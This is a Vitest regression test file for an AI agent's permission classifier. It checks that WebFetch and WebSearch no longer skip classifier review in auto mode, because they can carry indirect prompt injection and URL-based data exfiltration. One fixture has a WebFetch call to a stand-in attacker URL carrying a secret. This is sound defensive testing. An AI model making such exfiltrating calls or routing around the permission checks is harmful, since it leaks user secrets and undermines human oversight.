/**
 * gaphunt3 #9 regression coverage.
 *
 * Verifies that WebFetch/WebSearch are no longer blanket auto-allowed in auto
 * mode. These tools ingest attacker-controllable external content (the
 * canonical indirect prompt-injection / data-exfil-via-URL vector), so they
 * must be routed through the classifier / permission evaluation instead of the
 * safe-tool allowlist fast path.
 *
 * Each assertion fails if the fix (removing WebFetch/WebSearch from
 * SAFE_YOLO_ALLOWLISTED_TOOLS) is reverted, and passes with it.
 */

import { afterEach, beforeEach, describe, expect, it } from "vitest";
import {
  __listAutoModeAllowlistedToolsForTesting,
  __resetClassifierStubSessionForTesting,
  __setRemoteClassifierStageRunnerForTesting,
  __setClassifierWarningSinkForTesting,
  classifyYoloAction,
  isAutoModeAllowlistedTool,
} from "src/permissions/classifier.js";
import { createEmptyToolPermissionContext } from "src/permissions/types.js";

const AUTO_MODE_ENV_KEYS = [
  "XAI_API_KEY",
  "GROK_API_KEY",
  "AGENC_XAI_API_KEY",
] as const;

function withAutoModeEnv<T>(
  overrides: Partial<
    Record<(typeof AUTO_MODE_ENV_KEYS)[number], string | undefined>
  >,
  body: () => Promise<T> | T,
): Promise<T> | T {
  const previous = Object.fromEntries(
    AUTO_MODE_ENV_KEYS.map((key) => [key, process.env[key]]),
  ) as Record<(typeof AUTO_MODE_ENV_KEYS)[number], string | undefined>;
  for (const key of AUTO_MODE_ENV_KEYS) {
    const next = overrides[key];
    if (next === undefined) {
      delete process.env[key];
    } else {
      process.env[key] = next;
    }
  }
  try {
    return body();
  } finally {
    for (const key of AUTO_MODE_ENV_KEYS) {
      const value = previous[key];
      if (value === undefined) {
        delete process.env[key];
      } else {
        process.env[key] = value;
      }
    }
  }
}

describe("gaphunt3 #9 — WebFetch/WebSearch are not auto-mode allowlisted", () => {
  beforeEach(() => {
    __resetClassifierStubSessionForTesting();
  });

  it("isAutoModeAllowlistedTool returns false for WebFetch and WebSearch", () => {
    expect(isAutoModeAllowlistedTool("WebFetch")).toBe(false);
    expect(isAutoModeAllowlistedTool("WebSearch")).toBe(false);
  });

  it("excludes WebFetch/WebSearch from the exported allowlist while keeping truly-safe tools", () => {
    const all = __listAutoModeAllowlistedToolsForTesting();
    expect(all).not.toContain("WebFetch");
    expect(all).not.toContain("WebSearch");
    // The change is surgical: other safe tools remain allowlisted.
    expect(all).toContain("Grep");
    expect(all).toContain("Glob");
    expect(all).toContain("ToolSearch");
    expect(all).toContain("FileRead");
  });

  it("does NOT fast-path-allow WebFetch via the allowlist (routes to classifier)", async () => {
    const captured: Array<{ cause: string }> = [];
    const restoreSink = __setClassifierWarningSinkForTesting((event) => {
      captured.push({ cause: event.cause });
    });
    try {
      await withAutoModeEnv({}, async () => {
        const result = await classifyYoloAction({
          messages: [],
          action: {
            toolName: "WebFetch",
            input: { url: "https://attacker.example/exfil?d=secret" },
          },
          tools: [],
          permissionContext: createEmptyToolPermissionContext(),
        });
        // Pre-fix: short-circuited with reason "allowlisted_tool",
        // shouldBlock=false. Post-fix: no allowlist short-circuit, so with no
        // xAI key it falls back to manual approval.
        expect(result.reason).not.toBe("allowlisted_tool");
        expect(result.shouldBlock).toBe(true);
        expect(result.unavailable).toBe(true);
        expect(result.reason).toContain(
          "runtime_classifier_manual_approval_required",
        );
      });
      expect(captured[0]?.cause).toBe(
        "auto_mode_classifier_missing_xai_api_key",
      );
    } finally {
      restoreSink();
    }
  });

  it("routes WebSearch through the remote classifier when xAI is configured", async () => {
    const seenStages: Array<{ stage: string; userPrompt: string }> = [];
    const restoreRunner = __setRemoteClassifierStageRunnerForTesting(
      async (request) => {
        seenStages.push({ stage: request.stage, userPrompt: request.userPrompt });
        return {
          shouldBlock: false,
          reason: "remote_reviewed_allow",
          usage: { inputTokens: 5, outputTokens: 2 },
          model: request.model,
        };
      },
    );
    try {
      await withAutoModeEnv({ XAI_API_KEY: "test-key" }, async () => {
        const result = await classifyYoloAction({
          messages: [{ role: "user", content: "Look up the weather" }],
          action: { toolName: "WebSearch", input: { query: "weather" } },
          tools: [],
          permissionContext: createEmptyToolPermissionContext(),
        });
        // The classifier (not the allowlist) made the decision.
        expect(result.reason).toBe("remote_reviewed_allow");
        expect(result.reason).not.toBe("allowlisted_tool");
      });
      // The classifier actually ran (would NOT run if still allowlisted).
      expect(seenStages.length).toBeGreaterThanOrEqual(1);
      expect(seenStages[0]?.stage).toBe("fast");
      expect(seenStages[0]?.userPrompt).toContain("WebSearch(");
    } finally {
      restoreRunner();
    }
  });

  it("still fast-path-allows a genuinely safe tool (Grep) so the change stays surgical", async () => {
    const result = await classifyYoloAction({
      messages: [],
      action: { toolName: "Grep", input: { pattern: "foo" } },
      tools: [],
      permissionContext: createEmptyToolPermissionContext(),
    });
    expect(result.shouldBlock).toBe(false);
    expect(result.reason).toBe("allowlisted_tool");
    expect(result.stage).toBe("fast");
  });
});
